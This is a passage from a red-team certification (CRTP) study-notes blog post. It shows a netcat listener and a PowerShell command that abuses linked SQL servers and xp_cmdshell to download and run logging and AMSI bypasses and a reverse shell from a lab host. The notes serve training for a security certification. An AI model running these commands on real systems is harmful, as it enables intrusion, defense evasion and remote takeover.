</span></pre></table></code></div></div><p>Let’s execute a PowerShell download execute cradle to execute a PowerShell reverse shell on the eu-sql instance. Remember to start a listener first with</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\netcat-win32-1.12\nc64.exe</span><span class="w"> </span><span class="nt">-lvp</span><span class="w"> </span><span class="nx">443</span><span class="w">
</span></pre></table></code></div></div><p>Then run</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-SQLServerLinkCrawl</span><span class="w"> </span><span class="nt">-Instance</span><span class="w"> </span><span class="nx">dcorp-mssql</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s1">'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.20/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.20/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.20/Invoke-PowerShellTcpEx.ps1)"'''</span><span class="w"> </span><span class="nt">-QueryTarget</span><span class="w"> </span><span class="nx">eu-sql</span><span class="w">
</span></pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/notes/'>notes</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >Active Directory</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Certified+Red+Team+Professional+Notes+-+Anubis-Sec&url=https%3A%2F%2Fahmedel-rayes.github.io%2Fposts%2FCRTP%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Certified+Red+Team+Professional+Notes+-+Anubis-Sec&u=https%3A%2F%2Fahmedel-rayes.github.io%2Fposts%2FCRTP%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fahmedel-rayes.github.io%2Fposts%2FCRTP%2F&text=Certified+Red+Team+Professional+Notes+-+Anubis-Sec" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/CPTS/">Certified Penetration Testing Specialist Notes</a><li><a href="/posts/CRTP/">Certified Red Team Professional Notes</a><li><a href="/posts/PortSwigger/">Port Swigger Academy Notes</a><li><a href="/posts/PNPT/">PNPT Notes</a><li><a href="/posts/ConsoleCowboy/">The Way of the Console Cowboy</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/outdated-software/">Outdated Software</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a> <a class="post-tag" href="/tags/hash-capture/">Hash Capture</a> <a class="post-tag" href="/tags/public-vulnerabilities/">Public Vulnerabilities</a> <a class="post-tag" href="/tags/weak-credentials/">Weak Credentials</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/anonymous-access/">Anonymous Access</a> <a class="post-tag" href="/tags/educational/">Educational</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/CPTS/"><div class="card-body"> <em class="small" data-ts="1680279120" data-df="ll" > Mar 31, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Certified Penetration Testing Specialist Notes</h3><div class="text-muted small"><p> Network Enumeration with Nmap Nmap is one of the most used tools by network admins and IT security specialists, it can be used to Audit the security aspects of networks, simulate penetration tests...</p></div></div></a></div><div class="card"> <a href="/posts/Querier/"><div class="card-body"> <em class="small" data-ts="1673380800" data-df="ll" > Jan 10, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Querier</h3><div class="text-muted small"><p> Querier is a medium level machine on HacktheBox that starts with discovering database credentials in the macros of a xlsm file on a network share. We can then login to the database as a low privele...</p></div></div></a></div><div class="card"> <a href="/posts/Bastion/"><div class="card-body"> <em class="small" data-ts="1673796600" data-df="ll" > Jan 15, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Bastion</h3><div class="text-muted small"><p> Bastion is a straight forward easy-level machine on HacktheBox that starts with enumerating a .vhd backup file that we mounted from an SMB share through anonymous login, from there we dump the user...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Nibbles/" class="btn btn-outline-primary" prompt="Older"><p>Nibbles</p></a> <a href="/posts/CPTS/" class="btn btn-outline-primary" prompt="Newer"><p>Certified Penetration Testing Specialist Notes</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/AhmedEl-Rayes">Ahmed El-Rayes</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/outdated-software/">Outdated Software</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a> <a class="post-tag" href="/tags/hash-capture/">Hash Capture</a> <a class="post-tag" href="/tags/public-vulnerabilities/">Public Vulnerabilities</a> <a class="post-tag" href="/tags/weak-credentials/">Weak Credentials</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/anonymous-access/">Anonymous Access</a> <a class="post-tag" href="/tags/educational/">Educational</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
